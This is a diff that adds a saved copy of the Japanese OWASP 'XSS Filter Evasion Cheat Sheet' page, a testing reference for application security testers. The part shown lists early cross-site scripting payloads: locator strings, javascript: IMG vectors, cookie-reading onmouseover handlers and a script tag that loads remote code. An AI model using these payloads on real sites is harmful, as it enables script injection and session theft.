@@ -1,0 +1,1350 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="client-nojs">
+<head>
+<meta charset="utf-8" />
+<title>XSS フィルター回避チートシート - OWASP</title>
+<meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
+<meta name="generator" content="MediaWiki 1.23.11" />
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="/opensearch_desc.php" title="OWASP (en)" />
+<link rel="EditURI" type="application/rsd+xml" href="https://www.owasp.org/api.php?action=rsd" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="OWASP Atom フィード" href="/index.php?title=Special:RecentChanges&amp;feed=atom" />
+<link rel="stylesheet" href="https://www.owasp.org/load.php?debug=false&amp;lang=en&amp;modules=mediawiki.legacy.commonPrint%2Cshared%7Cmediawiki.skinning.interface%7Cmediawiki.ui.button%7Cskins.vector.styles&amp;only=styles&amp;skin=vector&amp;*" />
+<link rel="stylesheet" href="/extensions/HeaderTabs/skins/ext.headertabs.large.css" /><meta name="ResourceLoaderDynamicStyles" content="" />
+<link rel="stylesheet" href="https://www.owasp.org/load.php?debug=false&amp;lang=en&amp;modules=site&amp;only=styles&amp;skin=vector&amp;*" />
+<style>a:lang(ar),a:lang(kk-arab),a:lang(mzn),a:lang(ps),a:lang(ur){text-decoration:none}
+/* cache key: wiki:resourceloader:filter:minify-css:7:29b70323345a439ab9ed7007e0c178a6 */</style>
+<script src="https://www.owasp.org/load.php?debug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if(window.mw){
+mw.config.set({"wgCanonicalNamespace":"","wgCanonicalSpecialPageName":false,"wgNamespaceNumber":0,"wgPageName":"XSS_Filter_Evasion_Cheat_Sheet","wgTitle":"XSS Filter Evasion Cheat Sheet","wgCurRevisionId":202050,"wgRevisionId":202050,"wgArticleId":26566,"wgIsArticle":true,"wgIsRedirect":false,"wgAction":"view","wgUserName":null,"wgUserGroups":["*"],"wgCategories":["Cheatsheets","Popular","OWASP Breakers"],"wgBreakFrames":false,"wgPageContentLanguage":"en","wgPageContentModel":"wikitext","wgSeparatorTransformTable":["",""],"wgDigitTransformTable":["",""],"wgDefaultDateFormat":"dmy","wgMonthNames":["","January","February","March","April","May","June","July","August","September","October","November","December"],"wgMonthNamesShort":["","Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"wgRelevantPageName":"XSS_Filter_Evasion_Cheat_Sheet","wgIsProbablyEditable":false,"wgRestrictionEdit":[],"wgRestrictionMove":[],"htTabIndexes":[],"wgCategoryTreePageCategoryOptions":"{\"mode\":0,\"hideprefix\":20,\"showcount\":true,\"namespaces\":false}"});
+}</script><script>if(window.mw){
+mw.loader.implement("user.options",function($,jQuery){mw.user.options.set({"ccmeonemails":0,"cols":80,"date":"default","diffonly":0,"disablemail":0,"editfont":"default","editondblclick":0,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":1,"extendwatchlist":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"imagesize":2,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nickname":"","norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"rcdays":7,"rclimit":50,"rows":25,"showhiddencats":0,"shownumberswatching":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":1,"watchdefault":1,"watchdeletion":0,"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,
+"useeditwarning":1,"prefershttps":1,"editsection":false,"language":"en","variant-gan":"gan","variant-iu":"iu","variant-kk":"kk","variant-ku":"ku","variant-shi":"shi","variant-sr":"sr","variant-tg":"tg","variant-uz":"uz","variant-zh":"zh","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false,"searchNs274":false,"searchNs275":false,"variant":"en"});},{},{});mw.loader.implement("user.tokens",function($,jQuery){mw.user.tokens.set({"editToken":"+\\","patrolToken":false,"watchToken":false});},{},{});
+/* cache key: wiki:resourceloader:filter:minify-js:7:60712566bd995a32fa50031484a6bded */
+}</script>
+<script>if(window.mw){
+mw.loader.load(["mediawiki.page.startup","mediawiki.legacy.wikibits","mediawiki.legacy.ajax","skins.vector.js"]);
+}</script>
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/skins/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr sitedir-ltr ns-0 ns-subject page-XSS_Filter_Evasion_Cheat_Sheet skin-vector action-view vector-animateLayout">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<div id="content" class="mw-body" role="main">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<h1 id="firstHeading" class="firstHeading" lang="en"><span dir="auto">XSS フィルター回避チートシート</span></h1>
+						<div id="bodyContent">
+								<div id="siteSub">OWASP 作成</div>
+								<div id="contentSub"></div>
+												<div id="jump-to-nav" class="mw-jump">
+					ジャンプ先:					<a href="#mw-navigation">移動</a>、					<a href="#p-search">検索</a>
+				</div>
+				<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><div style="width:100%;height:160px;border:0,margin:0;overflow: hidden;"><img alt="Cheatsheets-header.jpg" src="/images/d/d8/Cheatsheets-header.jpg" width="2400" height="160" /></div><br />
+<p>最終改訂日 (yy/mm/dd):<b>2015/10/12</b> 
+</p>
+<h1><span class="mw-headline" id="Introduction">はじめに</span></h1>
+ <div id="toc" class="toc"><div id="toctitle"><h2></h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="#Introduction"><span class="tocnumber">1</span> <span class="toctext">はじめに</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="#Tests"><span class="tocnumber">2</span> <span class="toctext">テスト</span></a>
+<ul>
+<li class="toclevel-2 tocsection-3"><a href="#XSS_Locator"><span class="tocnumber">2.1</span> <span class="toctext">XSS ロケーター</span></a></li>
+<li class="toclevel-2 tocsection-4"><a href="#XSS_Locator_.28short.29"><span class="tocnumber">2.2</span> <span class="toctext">XSS ロケーター (短縮版)</span></a></li>
+<li class="toclevel-2 tocsection-5"><a href="#No_Filter_Evasion"><span class="tocnumber">2.3</span> <span class="toctext">フィルター回避なし</span></a></li>
+<li class="toclevel-2 tocsection-6"><a href="#Image_XSS_using_the_JavaScript_directive"><span class="tocnumber">2.4</span> <span class="toctext">JavaScript ディレクティブを使用したイメージ XSS</span></a></li>
+<li class="toclevel-2 tocsection-7"><a href="#No_quotes_and_no_semicolon"><span class="tocnumber">2.5</span> <span class="toctext">引用符なし、セミコロンなし</span></a></li>
+<li class="toclevel-2 tocsection-8"><a href="#Case_insensitive_XSS_attack_vector"><span class="tocnumber">2.6</span> <span class="toctext">大文字小文字を区別する XSS 攻撃ベクトル</span></a></li>
+<li class="toclevel-2 tocsection-9"><a href="#HTML_entities"><span class="tocnumber">2.7</span> <span class="toctext">HTML エンティティ</span></a></li>
+<li class="toclevel-2 tocsection-10"><a href="#Grave_accent_obfuscation"><span class="tocnumber">2.8</span> <span class="toctext">抑音符号の難読化</span></a></li>
+<li class="toclevel-2 tocsection-11"><a href="#Malformed_A_tags"><span class="tocnumber">2.9</span> <span class="toctext">誤った形式の A タグ</span></a></li>
+<li class="toclevel-2 tocsection-12"><a href="#Malformed_IMG_tags"><span class="tocnumber">2.10</span> <span class="toctext">誤った形式の IMG タグ</span></a></li>
+<li class="toclevel-2 tocsection-13"><a href="#fromCharCode"><span class="tocnumber">2.11</span> <span class="toctext">fromCharCode</span></a></li>
+<li class="toclevel-2 tocsection-14"><a href="#Default_SRC_tag_to_get_past_filters_that_check_SRC_domain"><span class="tocnumber">2.12</span> <span class="toctext">SRC タグを初期化して、SRC ドメインを確認するフィルターを通過する</span></a></li>
+<li class="toclevel-2 tocsection-15"><a href="#Default_SRC_tag_by_leaving_it_empty"><span class="tocnumber">2.13</span> <span class="toctext">空にすることによる SRC タグの初期化</span></a></li>
+<li class="toclevel-2 tocsection-16"><a href="#Default_SRC_tag_by_leaving_it_out_entirely"><span class="tocnumber">2.14</span> <span class="toctext">完全に除去することによる SRC タグの初期化</span></a></li>
+<li class="toclevel-2 tocsection-17"><a href="#On_error_alert"><span class="tocnumber">2.15</span> <span class="toctext">On error アラート</span></a></li>
+<li class="toclevel-2 tocsection-18"><a href="#IMG_onerror_and_javascript_alert_encode"><span class="tocnumber">2.16</span> <span class="toctext">IMG onerror および javascript アラートのエンコード</span></a></li>
+<li class="toclevel-2 tocsection-19"><a href="#Decimal_HTML_character_references"><span class="tocnumber">2.17</span> <span class="toctext">10 進数の HTML 文字の参照</span></a></li>
+<li class="toclevel-2 tocsection-20"><a href="#Decimal_HTML_character_references_without_trailing_semicolons"><span class="tocnumber">2.18</span> <span class="toctext">末尾にセミコロンを使用しない、10 進数の HTML 文字の参照</span></a></li>
+<li class="toclevel-2 tocsection-21"><a href="#Hexadecimal_HTML_character_references_without_trailing_semicolons"><span class="tocnumber">2.19</span> <span class="toctext">末尾にセミコロンを使用しない、16 進数の HTML 文字の参照</span></a></li>
+<li class="toclevel-2 tocsection-22"><a href="#Embedded_tab"><span class="tocnumber">2.20</span> <span class="toctext">埋め込みタブ</span></a></li>
+<li class="toclevel-2 tocsection-23"><a href="#Embedded_Encoded_tab"><span class="tocnumber">2.21</span> <span class="toctext">埋め込みエンコードタブ</span></a></li>
+<li class="toclevel-2 tocsection-24"><a href="#Embedded_newline_to_break_up_XSS"><span class="tocnumber">2.22</span> <span class="toctext">改行の埋め込みによる XSS の中断</span></a></li>
+<li class="toclevel-2 tocsection-25"><a href="#Embedded_carriage_return_to_break_up_XSS"><span class="tocnumber">2.23</span> <span class="toctext">復帰の埋め込みによる XSS の中断</span></a></li>
+<li class="toclevel-2 tocsection-26"><a href="#Null_breaks_up_JavaScript_directive"><span class="tocnumber">2.24</span> <span class="toctext">Null 値による JavaScript ディレクティブの中断</span></a></li>
+<li class="toclevel-2 tocsection-27"><a href="#Spaces_and_meta_chars_before_the_JavaScript_in_images_for_XSS"><span class="tocnumber">2.25</span> <span class="toctext">XSS のイメージでの JavaScript 前のスペースおよびメタ文字</span></a></li>
+<li class="toclevel-2 tocsection-28"><a href="#Non-alpha-non-digit_XSS"><span class="tocnumber">2.26</span> <span class="toctext">英数字以外の XSS</span></a></li>
+<li class="toclevel-2 tocsection-29"><a href="#Extraneous_open_brackets"><span class="tocnumber">2.27</span> <span class="toctext">外側の左括弧</span></a></li>
+<li class="toclevel-2 tocsection-30"><a href="#No_closing_script_tags"><span class="tocnumber">2.28</span> <span class="toctext">スクリプトの終了タグなし</span></a></li>
+<li class="toclevel-2 tocsection-31"><a href="#Protocol_resolution_in_script_tags"><span class="tocnumber">2.29</span> <span class="toctext">スクリプトタグにおけるプロトコル解決</span></a></li>
+<li class="toclevel-2 tocsection-32"><a href="#Half_open_HTML.2FJavaScript_XSS_vector"><span class="tocnumber">2.30</span> <span class="toctext">片方の括弧がない HTML/JavaScript XSS ベクトル</span></a></li>
+<li class="toclevel-2 tocsection-33"><a href="#Double_open_angle_brackets"><span class="tocnumber">2.31</span> <span class="toctext">二重左不等号括弧</span></a></li>
+<li class="toclevel-2 tocsection-34"><a href="#Escaping_JavaScript_escapes"><span class="tocnumber">2.32</span> <span class="toctext">JavaScript エスケープのエスケープ</span></a></li>
+<li class="toclevel-2 tocsection-35"><a href="#End_title_tag"><span class="tocnumber">2.33</span> <span class="toctext">タイトルタグの終了</span></a></li>
+<li class="toclevel-2 tocsection-36"><a href="#INPUT_image"><span class="tocnumber">2.34</span> <span class="toctext">INPUT イメージ</span></a></li>
+<li class="toclevel-2 tocsection-37"><a href="#BODY_image"><span class="tocnumber">2.35</span> <span class="toctext">BODY イメージ</span></a></li>
+<li class="toclevel-2 tocsection-38"><a href="#IMG_Dynsrc"><span class="tocnumber">2.36</span> <span class="toctext">IMG Dynsrc</span></a></li>
+<li class="toclevel-2 tocsection-39"><a href="#IMG_lowsrc"><span class="tocnumber">2.37</span> <span class="toctext">IMG lowsrc</span></a></li>
+<li class="toclevel-2 tocsection-40"><a href="#List-style-image"><span class="tocnumber">2.38</span> <span class="toctext">List-style-image</span></a></li>
+<li class="toclevel-2 tocsection-41"><a href="#VBscript_in_an_image"><span class="tocnumber">2.39</span> <span class="toctext">イメージ内の VBscript</span></a></li>
+<li class="toclevel-2 tocsection-42"><a href="#Livescript_.28older_versions_of_Netscape_only.29"><span class="tocnumber">2.40</span> <span class="toctext">Livescript (旧バージョンの Netscape のみ)</span></a></li>
+<li class="toclevel-2 tocsection-43"><a href="#BODY_tag"><span class="tocnumber">2.41</span> <span class="toctext">BODY タグ</span></a></li>
+<li class="toclevel-2 tocsection-44"><a href="#Event_Handlers"><span class="tocnumber">2.42</span> <span class="toctext">イベントハンドラ</span></a></li>
+<li class="toclevel-2 tocsection-45"><a href="#BGSOUND"><span class="tocnumber">2.43</span> <span class="toctext">BGSOUND</span></a></li>
+<li class="toclevel-2 tocsection-46"><a href="#.26_JavaScript_includes"><span class="tocnumber">2.44</span> <span class="toctext">& JavaScript インクルード</span></a></li>
+<li class="toclevel-2 tocsection-47"><a href="#STYLE_sheet"><span class="tocnumber">2.45</span> <span class="toctext">スタイルシート</span></a></li>
+<li class="toclevel-2 tocsection-48"><a href="#Remote_style_sheet"><span class="tocnumber">2.46</span> <span class="toctext">リモートスタイルシート</span></a></li>
+<li class="toclevel-2 tocsection-49"><a href="#Remote_style_sheet_part_2"><span class="tocnumber">2.47</span> <span class="toctext">リモートスタイルシート パート 2</span></a></li>
+<li class="toclevel-2 tocsection-50"><a href="#Remote_style_sheet_part_3"><span class="tocnumber">2.48</span> <span class="toctext">リモートスタイルシート パート 3</span></a></li>
+<li class="toclevel-2 tocsection-51"><a href="#Remote_style_sheet_part_4"><span class="tocnumber">2.49</span> <span class="toctext">リモートスタイルシート パート 4</span></a></li>
+<li class="toclevel-2 tocsection-52"><a href="#STYLE_tags_with_broken_up_JavaScript_for_XSS"><span class="tocnumber">2.50</span> <span class="toctext">XSS で JavaScript を中断する STYLE タグ</span></a></li>
+<li class="toclevel-2 tocsection-53"><a href="#STYLE_attribute_using_a_comment_to_break_up_expression"><span class="tocnumber">2.51</span> <span class="toctext">コメントを使用して式を中断する STYLE 属性</span></a></li>
+<li class="toclevel-2 tocsection-54"><a href="#IMG_STYLE_with_expression"><span class="tocnumber">2.52</span> <span class="toctext">式付きの IMG STYLE</span></a></li>
+<li class="toclevel-2 tocsection-55"><a href="#STYLE_tag_.28Older_versions_of_Netscape_only.29"><span class="tocnumber">2.53</span> <span class="toctext">STYLE タグ (旧バージョンの Netscape のみ)</span></a></li>
+<li class="toclevel-2 tocsection-56"><a href="#STYLE_tag_using_background-image"><span class="tocnumber">2.54</span> <span class="toctext">背景イメージを使用する STYLE タグ</span></a></li>
+<li class="toclevel-2 tocsection-57"><a href="#STYLE_tag_using_background"><span class="tocnumber">2.55</span> <span class="toctext">背景を使用する STYLE タグ</span></a></li>
+<li class="toclevel-2 tocsection-58"><a href="#Anonymous_HTML_with_STYLE_attribute"><span class="tocnumber">2.56</span> <span class="toctext">STYLE 属性を持つ匿名 HTML</span></a></li>
+<li class="toclevel-2 tocsection-59"><a href="#Local_htc_file"><span class="tocnumber">2.57</span> <span class="toctext">ローカル htc ファイル</span></a></li>
+<li class="toclevel-2 tocsection-60"><a href="#US-ASCII_encoding"><span class="tocnumber">2.58</span> <span class="toctext">US-ASCII エンコード</span></a></li>
+<li class="toclevel-2 tocsection-61"><a href="#META"><span class="tocnumber">2.59</span> <span class="toctext">META</span></a>
+<ul>
+<li class="toclevel-3 tocsection-62"><a href="#META_using_data"><span class="tocnumber">2.59.1</span> <span class="toctext">データを使用する META</span></a></li>
+<li class="toclevel-3 tocsection-63"><a href="#META_with_additional_URL_parameter"><span class="tocnumber">2.59.2</span> <span class="toctext">追加 URL パラメーターを持つ META</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-64"><a href="#IFRAME"><span class="tocnumber">2.60</span> <span class="toctext">IFRAME</span></a></li>
+<li class="toclevel-2 tocsection-65"><a href="#IFRAME_Event_based"><span class="tocnumber">2.61</span> <span class="toctext">IFRAME イベントベース</span></a></li>
+<li class="toclevel-2 tocsection-66"><a href="#FRAME"><span class="tocnumber">2.62</span> <span class="toctext">FRAME</span></a></li>
+<li class="toclevel-2 tocsection-67"><a href="#TABLE"><span class="tocnumber">2.63</span> <span class="toctext">TABLE</span></a>
+<ul>
+<li class="toclevel-3 tocsection-68"><a href="#TD"><span class="tocnumber">2.63.1</span> <span class="toctext">TD</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-69"><a href="#DIV"><span class="tocnumber">2.64</span> <span class="toctext">DIV</span></a>
+<ul>
+<li class="toclevel-3 tocsection-70"><a href="#DIV_background-image"><span class="tocnumber">2.64.1</span> <span class="toctext">DIV background-image</span></a></li>
+<li class="toclevel-3 tocsection-71"><a href="#DIV_background-image_with_unicoded_XSS_exploit"><span class="tocnumber">2.64.2</span> <span class="toctext">unicode 化した XSS エクスプロイトを持つ DIV background-image</span></a></li>
+<li class="toclevel-3 tocsection-72"><a href="#DIV_background-image_plus_extra_characters"><span class="tocnumber">2.64.3</span> <span class="toctext">DIV background-image と追加文字</span></a></li>
+<li class="toclevel-3 tocsection-73"><a href="#DIV_expression"><span class="tocnumber">2.64.4</span> <span class="toctext">DIV 式</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-74"><a href="#Downlevel-Hidden_block"><span class="tocnumber">2.65</span> <span class="toctext">Downlevel-Hidden ブロック</span></a></li>
+<li class="toclevel-2 tocsection-75"><a href="#BASE_tag"><span class="tocnumber">2.66</span> <span class="toctext">BASE タグ</span></a></li>
+<li class="toclevel-2 tocsection-76"><a href="#OBJECT_tag"><span class="tocnumber">2.67</span> <span class="toctext">OBJECT タグ</span></a></li>
+<li class="toclevel-2 tocsection-77"><a href="#Using_an_EMBED_tag_you_can_embed_a_Flash_movie_that_contains_XSS"><span class="tocnumber">2.68</span> <span class="toctext">XSS を含む Flash 動画を埋め込むことができる EMBED タグの使用</span></a></li>
+<li class="toclevel-2 tocsection-78"><a href="#You_can_EMBED_SVG_which_can_contain_your_XSS_vector"><span class="tocnumber">2.69</span> <span class="toctext">XSS ベクトルを含むことができる SVG の埋め込み</span></a></li>
+<li class="toclevel-2 tocsection-79"><a href="#Using_ActionScript_inside_flash_can_obfuscate_your_XSS_vector"><span class="tocnumber">2.70</span> <span class="toctext">Flash 内で ActionScript を使用して XSS ベクトルを難読化する</span></a></li>
+<li class="toclevel-2 tocsection-80"><a href="#XML_data_island_with_CDATA_obfuscation"><span class="tocnumber">2.71</span> <span class="toctext">CDATA 難読化による XML データアイランド</span></a></li>
+<li class="toclevel-2 tocsection-81"><a href="#Locally_hosted_XML_with_embedded_JavaScript_that_is_generated_using_an_XML_data_island"><span class="tocnumber">2.72</span> <span class="toctext">XML データアイランドを使用して生成された埋め込み JavaScript でローカルでホストされた XML</span></a></li>
+<li class="toclevel-2 tocsection-82"><a href="#HTML.2BTIME_in_XML"><span class="tocnumber">2.73</span> <span class="toctext">XML での HTML+TIME</span></a></li>
+<li class="toclevel-2 tocsection-83"><a href="#Assuming_you_can_only_fit_in_a_few_characters_and_it_filters_against_.22.js.22"><span class="tocnumber">2.74</span> <span class="toctext">数文字しか挿入できず、".js" に対してフィルターする場合</span></a></li>
+<li class="toclevel-2 tocsection-84"><a href="#SSI_.28Server_Side_Includes.29"><span class="tocnumber">2.75</span> <span class="toctext">SSI (サーバーサイドインクルード)</span></a></li>
+<li class="toclevel-2 tocsection-85"><a href="#PHP"><span class="tocnumber">2.76</span> <span class="toctext">PHP</span></a></li>
+<li class="toclevel-2 tocsection-86"><a href="#IMG_Embedded_commands"><span class="tocnumber">2.77</span> <span class="toctext">IMG 埋め込みコマンド</span></a>
+<ul>
+<li class="toclevel-3 tocsection-87"><a href="#IMG_Embedded_commands_part_II"><span class="tocnumber">2.77.1</span> <span class="toctext">IMG 埋め込みコマンド パート 2</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-88"><a href="#Cookie_manipulation"><span class="tocnumber">2.78</span> <span class="toctext">Cookie の操作</span></a></li>
+<li class="toclevel-2 tocsection-89"><a href="#UTF-7_encoding"><span class="tocnumber">2.79</span> <span class="toctext">UTF-7 エンコード</span></a></li>
+<li class="toclevel-2 tocsection-90"><a href="#XSS_using_HTML_quote_encapsulation"><span class="tocnumber">2.80</span> <span class="toctext">HTML 引用符のカプセル化を使用した XSS</span></a></li>
+<li class="toclevel-2 tocsection-91"><a href="#URL_string_evasion"><span class="tocnumber">2.81</span> <span class="toctext">URL 文字列回避</span></a>
+<ul>
+<li class="toclevel-3 tocsection-92"><a href="#IP_verses_hostname"><span class="tocnumber">2.81.1</span> <span class="toctext">IP によるホスト名の作成</span></a></li>
+<li class="toclevel-3 tocsection-93"><a href="#URL_encoding"><span class="tocnumber">2.81.2</span> <span class="toctext">URL エンコード</span></a></li>
+<li class="toclevel-3 tocsection-94"><a href="#Dword_encoding"><span class="tocnumber">2.81.3</span> <span class="toctext">Dword エンコード</span></a></li>
+<li class="toclevel-3 tocsection-95"><a href="#Hex_encoding"><span class="tocnumber">2.81.4</span> <span class="toctext">Hex エンコード</span></a></li>
+<li class="toclevel-3 tocsection-96"><a href="#Octal_encoding"><span class="tocnumber">2.81.5</span> <span class="toctext">Octal エンコード</span></a></li>
+<li class="toclevel-3 tocsection-97"><a href="#Mixed_encoding"><span class="tocnumber">2.81.6</span> <span class="toctext">混合エンコード</span></a></li>
+<li class="toclevel-3 tocsection-98"><a href="#Protocol_resolution_bypass"><span class="tocnumber">2.81.7</span> <span class="toctext">プロトコル解決のバイパス</span></a></li>
+<li class="toclevel-3 tocsection-99"><a href="#Google_.22feeling_lucky.22_part_1."><span class="tocnumber">2.81.8</span> <span class="toctext">Google "feeling lucky" パート 1</span></a></li>
+<li class="toclevel-3 tocsection-100"><a href="#Google_.22feeling_lucky.22_part_2."><span class="tocnumber">2.81.9</span> <span class="toctext">Google "feeling lucky" パート 2</span></a></li>
+<li class="toclevel-3 tocsection-101"><a href="#Google_.22feeling_lucky.22_part_3."><span class="tocnumber">2.81.10</span> <span class="toctext">Google "feeling lucky" パート 3</span></a></li>
+<li class="toclevel-3 tocsection-102"><a href="#Removing_cnames"><span class="tocnumber">2.81.11</span> <span class="toctext">cnames の除去</span></a></li>
+<li class="toclevel-3 tocsection-103"><a href="#Extra_dot_for_absolute_DNS:"><span class="tocnumber">2.81.12</span> <span class="toctext">絶対 DNS の追加ドット</span></a></li>
+<li class="toclevel-3 tocsection-104"><a href="#JavaScript_link_location:"><span class="tocnumber">2.81.13</span> <span class="toctext">JavaScript リンクロケーション:</span></a></li>
+<li class="toclevel-3 tocsection-105"><a href="#Content_replace_as_attack_vector"><span class="tocnumber">2.81.14</span> <span class="toctext">攻撃ベクトルとしてのコンテンツ置換</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2 tocsection-106"><a href="#Character_escape_sequences"><span class="tocnumber">2.82</span> <span class="toctext">文字エスケープシーケンス</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-107"><a href="#Character_Encoding_and_IP_Obfuscation_Calculators"><span class="tocnumber">3</span> <span class="toctext">文字エンコードおよび IP 難読化計算機能</span></a></li>
+<li class="toclevel-1 tocsection-108"><a href="#Authors_and_Primary_Editors"><span class="tocnumber">4</span> <span class="toctext">著者と編集者</span></a></li>
+<li class="toclevel-1 tocsection-109"><a href="#Other_Cheatsheets"><span class="tocnumber">5</span> <span class="toctext">その他のチートシート</span></a></li>
+</ul>
+</div>
+この資料は、アプリケーションセキュリティのテスト技術者に、クロスサイトスクリプティングのテストを支援するガイドを提供することに重点を置いています。この資料の内容は最初に、RSnake によって、彼のセミナーの XSS チートシート (以下を参照) から OWASP に寄付されました。<a rel="nofollow" class="external free" href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a>.現在このサイトにアクセスすると、この新しいサイトにリダイレクトされるようになっており、今後はここで保守や強化が行われる予定です。最初に作成された OWASP 対策チートシート、<a href="/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" title="クロスサイトスクリプティング (XSS) 対策チートシート">XSS (クロスサイトスクリプティング) 対策チートシート</a>は、RSnake の XSS チートシートをベースにして作成しており、彼に謝意を表します。私たちは、攻撃に関する複雑なチートシートにあらゆる巧妙なトリックを列挙して、とにかくこれらを防ぐアプリケーションを構築せよと開発者に言うのではなく、XSS を防止するために準拠するべき、短く簡潔なガイドラインを作成したいと考えました。その結果生まれたのが、<a href="/index.php/Cheat_Sheets" title="チートシート" class="mw-redirect">OWASP チートシートシリーズ</a>です。
+<h1><span class="mw-headline" id="Tests">テスト</span></h1>
+<p>このチートシートは、XSS 攻撃の基本を既に理解しており、フィルター回避の意味をより詳しく理解したいユーザーを対象にしています。 
+</p><p>これらのクロスサイトスクリプティング (XSS) ベクトルの大半は、スクリプトの下部にリストされているブラウザーでテスト済みです。
+</p>
+<h2><span class="mw-headline" id="XSS_Locator">XSS ロケーター</span></h2>
+<p>次の文字列を挿入します。特別な XSS ベクトル要件がなくてもスクリプトが脆弱な場合は通常、”XSS" という単語がポップアップされます。この <a rel="nofollow" class="external text" href="http://ha.ckers.org/xsscalc.html">URL エンコード計算機能</a>を使用して、文字列全体をエンコードします。ヒント: 急いでページをチェックする必要がある場合、多くの場合、より下位の "&lt;PLAINTEXT&gt" タグを挿入するだけで十分です。出力が明示的に破壊されるので、XSS に対して脆弱かどうかを確認できます。
+</p>
+<pre>';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//&quot;;
+alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--
+&gt;&lt;/SCRIPT&gt;&quot;&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+</pre>
+<h2><span class="mw-headline" id="XSS_Locator_.28short.29">XSS ロケーター (短縮版)</span></h2>
+<p>スペースに余裕がなく、ページに脆弱な JavaScript がないことがわかっている場合、この文字列は、コンパクトな XSS インジェクションチェックとして最適です。挿入後のソースを確認し、&lt;XSS が &amp;&lt;XSS に変換されているかどうか調べて、脆弱かどうか確認します。
+</p>
+<pre>&#39;&#39;;!--"&lt;XSS&gt;=&amp;{()}
+</pre>
+<h2><span class="mw-headline" id="No_Filter_Evasion">フィルター回避なし</span></h2>
+<p>これは通常の XSS JavaScript インジェクションであり、捕捉されやすいのですが、最初にこれを試すことを推奨します (最新のブラウザーの多くで引用符は必要ないため、ここでも省略します)。
+</p>
+<pre>&lt;SCRIPT SRC=http:&#47;&#47;ha.ckers.org&#47;xss.js&gt;&lt;/SCRIPT&gt;
+</pre>
+<h2><span class="mw-headline" id="Image_XSS_using_the_JavaScript_directive">JavaScript ディレクティブを使用したイメージ XSS</span></h2>
+<p>JavaScript ディレクティブを使用したイメージ XSS (IE 7.0 は、イメージのコンテキストで JavaScript ディレクティブをサポートしていませんが、他のコンテキストではサポートしています。ただし、以下の例は、他のタグと同様に動作するものとして示されています。)
+</p>
+<pre>&lt;IMG SRC="javascript:alert('XSS');"&gt;
+</pre>
+<h2><span class="mw-headline" id="No_quotes_and_no_semicolon">引用符なし、セミコロンなし</span></h2>
+<pre>&lt;IMG SRC=javascript:alert('XSS')&gt;
+</pre>
+<h2><span class="mw-headline" id="Case_insensitive_XSS_attack_vector">大文字小文字を区別する XSS 攻撃ベクトル</span></h2>
+<pre>&lt;IMG SRC=JaVaScRiPt:alert('XSS')&gt;
+</pre>
+<h2><span class="mw-headline" id="HTML_entities">HTML エンティティ</span></h2>
+<p>動作するにはセミコロンが必要です。
+</p>
+<pre>&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;
+</pre>
+<h2><span class="mw-headline" id="Grave_accent_obfuscation">抑音符号の難読化</span></h2>
+<p>二重引用符と一重引用符の両方を使用する必要がある場合、抑音符号を使用して JavaScript の文字列をカプセル化できます。これは、クロスサイトスクリプティングフィルターの多くが抑音符号を認識しないため有効です。
+</p>
+<pre>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`&gt;
+</pre>
+<h2><span class="mw-headline" id="Malformed_A_tags">誤った形式の A タグ</span></h2>
+<p>HREF 属性をスキップして、XXS の本質に到達します... 
+David Cross による投稿 ~ Chromeで確認済み
+</p><p>&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;
+</p><p>Chrome は、ユーザーのために欠落した引用符を置換してくれます。引用符がないままにしていても、Chrome は適切な場所に引用符を配置し、URL またはスクリプトで欠落した引用符を修正します。
+</p><p>&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;
+</p>
+<h2><span class="mw-headline" id="Malformed_IMG_tags">誤った形式の IMG タグ</span></h2>
